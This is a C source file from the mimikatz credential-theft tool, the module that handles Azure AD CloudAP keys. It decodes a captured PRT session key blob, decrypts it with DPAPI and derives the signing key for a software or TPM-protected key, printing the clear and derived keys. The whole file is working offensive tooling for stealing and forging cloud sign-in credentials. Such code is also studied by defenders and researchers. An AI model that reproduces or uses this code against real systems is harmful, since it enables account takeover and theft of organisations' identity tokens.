/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_dpapi_cloudap.h"

NTSTATUS kuhl_m_dpapi_cloudap_keyvalue_derived(int argc, wchar_t * argv[])
{
	LPCWSTR szKeyValue, szContext, szLabel;
	BOOL isValidContext = FALSE, isDerivedKey = FALSE;

	PKIWI_POPKEY pKeyValue;
	DWORD cbKeyValue;
	LPVOID pDataOut;
	DWORD dwDataOutLen;
	PKIWI_POPKEY_HARD pHard;
	BYTE Context[24], DerivedKey[32];
	NCryptBuffer buffer[] = {
		{0, KDF_LABEL, NULL},
		{sizeof(Context), KDF_CONTEXT, Context},
		{sizeof(NCRYPT_SHA256_ALGORITHM), KDF_HASH_ALGORITHM, NCRYPT_SHA256_ALGORITHM},
	};
	NCryptBufferDesc bufferDesc = {NCRYPTBUFFER_VERSION, ARRAYSIZE(buffer), buffer};

	if(kull_m_string_args_byName(argc, argv, L"context", &szContext, NULL))
	{
		isValidContext = kull_m_string_stringToHex(szContext, Context, sizeof(Context));
		if(!isValidContext)
			PRINT_ERROR(L"context must be an hex string of 48 char (24 bytes) -- it will be random\n");
	}
	if(!isValidContext)
		CDGenerateRandomBits(Context, sizeof(Context));

	kull_m_string_args_byName(argc, argv, L"label", &szLabel, L"AzureAD-SecureConversation");
	if(buffer[0].pvBuffer = kull_m_string_unicode_to_ansi(szLabel))
	{
		buffer[0].cbBuffer = lstrlenA((LPCSTR) buffer[0].pvBuffer);

		kprintf(L"Label      : %.*S\n", buffer[0].cbBuffer, buffer[0].pvBuffer);
		kprintf(L"Context    : ");
		kull_m_string_wprintf_hex(buffer[1].pvBuffer, buffer[1].cbBuffer, 0);
		kprintf(L"\n");

		if(kull_m_string_args_byName(argc, argv, L"keyvalue", &szKeyValue, NULL))
		{
			if(lstrlen(szKeyValue) == (32 * 2))
			{
				if(kull_m_string_stringToHexBuffer(szKeyValue, (LPBYTE *) &pDataOut, &dwDataOutLen))
				{
					kprintf(L"Clear key  : ");
					kull_m_string_wprintf_hex(pDataOut, dwDataOutLen, 0);
					kprintf(L"\n");
					isDerivedKey = kuhl_m_dpapi_cloudap_keyvalue_derived_software(&bufferDesc, (LPCBYTE) pDataOut, dwDataOutLen, DerivedKey, sizeof(DerivedKey));
					LocalFree(pDataOut);
				}
			}
			else if(kull_m_string_quick_urlsafe_base64_to_Binary(szKeyValue, (PBYTE *) &pKeyValue, &cbKeyValue))
			{
				if(kuhl_m_dpapi_unprotect_raw_or_blob(pKeyValue->key, cbKeyValue - FIELD_OFFSET(KIWI_POPKEY, key), NULL, argc, argv, NULL, 0, &pDataOut, &dwDataOutLen, NULL))
				{
					kprintf(L"Key type   : ");
					switch(pKeyValue->type)
					{
					case 1:
						kprintf(L"software\n");
						kprintf(L"Key value  : ");
						kull_m_string_wprintf_hex(pDataOut, dwDataOutLen, 0);
						kprintf(L"\n");
						isDerivedKey = kuhl_m_dpapi_cloudap_keyvalue_derived_software(&bufferDesc, (LPCBYTE) pDataOut, dwDataOutLen, DerivedKey, sizeof(DerivedKey));
						break;

					case 2:
						kprintf(L"TPM protected\n");
						pHard = (PKIWI_POPKEY_HARD) pDataOut;
						kprintf(L"Key Name   : %.*s\n", pHard->cbName / sizeof(wchar_t), pHard->data);
						isDerivedKey = kuhl_m_dpapi_cloudap_keyvalue_derived_hardware(&bufferDesc, (LPCWSTR) pHard->data, pHard->data + pHard->cbName, pHard->cbKey, DerivedKey, sizeof(DerivedKey));
						break;

					default:
						PRINT_ERROR(L"KeyValue type is not supported (%u)\n", pKeyValue->type);
					}
				}
				LocalFree(pKeyValue);
			}
			else PRINT_ERROR(L"Unable to decode base64\n");

			if(isDerivedKey)
			{
				kprintf(L"Derived Key: ");
				kull_m_string_wprintf_hex(DerivedKey, sizeof(DerivedKey), 0);
				kprintf(L"\n");
			}
		}
		else PRINT_ERROR(L"a /keyvalue:base64data (or raw 32 bytes in hex) must be present");
	}
	return STATUS_SUCCESS;
}

BOOL kuhl_m_dpapi_cloudap_keyvalue_derived_software(PNCryptBufferDesc bufferDesc, LPCBYTE Key, DWORD cbKey, PBYTE DerivedKey, DWORD cbDerivedKey)
{
	BOOL status = FALSE;
	NTSTATUS bStatus;

	BCRYPT_ALG_HANDLE hAlgSP800108;
	BCRYPT_KEY_HANDLE hKeySP800108;
	DWORD ObjectLengthSP800108, cbResult;
	PUCHAR pbKeyObjectSP800108;

	__try
	{
		bStatus = BCryptOpenAlgorithmProvider(&hAlgSP800108, BCRYPT_SP800108_CTR_HMAC_ALGORITHM, NULL, 0);
		if(BCRYPT_SUCCESS(bStatus))
		{
			bStatus = BCryptGetProperty(hAlgSP800108, BCRYPT_OBJECT_LENGTH, (PUCHAR) &ObjectLengthSP800108, sizeof(ObjectLengthSP800108), &cbResult, 0);
			if(BCRYPT_SUCCESS(bStatus))
			{
				if(pbKeyObjectSP800108 = (PUCHAR) LocalAlloc(LPTR, ObjectLengthSP800108))
				{
					bStatus = BCryptGenerateSymmetricKey(hAlgSP800108, &hKeySP800108, pbKeyObjectSP800108, ObjectLengthSP800108, (PUCHAR) Key, cbKey, 0);
					if(BCRYPT_SUCCESS(bStatus))
					{
						bStatus = BCryptKeyDerivation(hKeySP800108, bufferDesc, DerivedKey, cbDerivedKey, &cbResult, 0);
						if(BCRYPT_SUCCESS(bStatus))
						{
							status = (cbResult == cbDerivedKey);
							if(!status)
								PRINT_ERROR(L"Bad cbResult (%u vs %u)\n", cbResult, cbDerivedKey);
						}
						else PRINT_ERROR(L"BCryptKeyDerivation: 0x%08x\n", bStatus);
						BCryptDestroyKey(hKeySP800108);
					}
					else PRINT_ERROR(L"BCryptGenerateSymmetricKey: 0x%08x\n", bStatus);
					LocalFree(pbKeyObjectSP800108);
				}
			}
			else PRINT_ERROR(L"BCryptGetProperty: 0x%08x\n", bStatus);
			BCryptCloseAlgorithmProvider(hAlgSP800108, 0);
		}
		else PRINT_ERROR(L"BCryptOpenAlgorithmProvider: 0x%08x\n", bStatus);
	}
	__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND)
	{
		PRINT_ERROR(L"No CNG?\n");
	}
	return status;
}

BOOL kuhl_m_dpapi_cloudap_keyvalue_derived_hardware(PNCryptBufferDesc bufferDesc, LPCWSTR TransportKeyName, LPCBYTE Key, DWORD cbKey, PBYTE DerivedKey, DWORD cbDerivedKey)
{
	BOOL status = FALSE;
	SECURITY_STATUS nStatus;
	NCRYPT_PROV_HANDLE hProvider;
	NCRYPT_KEY_HANDLE hImportKey, hKey;
	DWORD cbResult;
	PNCRYPTKEYDERIVATION NCryptKeyDerivation; // tofix

	__try
	{
		nStatus = NCryptOpenStorageProvider(&hProvider, MS_PLATFORM_CRYPTO_PROVIDER, 0);
		if(nStatus == ERROR_SUCCESS)
		{
			nStatus = NCryptOpenKey(hProvider, &hImportKey, TransportKeyName, 0, 0);
			if(nStatus == ERROR_SUCCESS)
			{
				nStatus = NCryptImportKey(hProvider, hImportKey, NCRYPT_OPAQUETRANSPORT_BLOB, NULL, &hKey, (PBYTE) Key, cbKey, 0);
				if(nStatus == ERROR_SUCCESS)
				{
					NCryptKeyDerivation = (PNCRYPTKEYDERIVATION) GetProcAddress(GetModuleHandle(L"ncrypt.dll"), "NCryptKeyDerivation"); // tofix
					nStatus = NCryptKeyDerivation(hKey, bufferDesc, DerivedKey, cbDerivedKey, &cbResult, 0);
					if(nStatus == ERROR_SUCCESS)
					{
						status = (cbResult == cbDerivedKey);
						if(!status)
							PRINT_ERROR(L"Bad cbResult (%u vs %u)\n", cbResult, cbDerivedKey);
					}
					else PRINT_ERROR(L"NCryptKeyDerivation: 0x%08x\n", nStatus);
					NCryptFreeObject(hKey);
				}
				else PRINT_ERROR(L"NCryptImportKey: 0x%08x\n", nStatus);
				NCryptFreeObject(hImportKey);
			}
			else PRINT_ERROR(L"NCryptOpenKey: 0x%08x\n", nStatus);
			NCryptFreeObject(hProvider);
		}
		else PRINT_ERROR(L"NCryptOpenStorageProvider: 0x%08x\n", nStatus);
	}
	__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND)
	{
		PRINT_ERROR(L"No CNG?\n");
	}
	return status;
}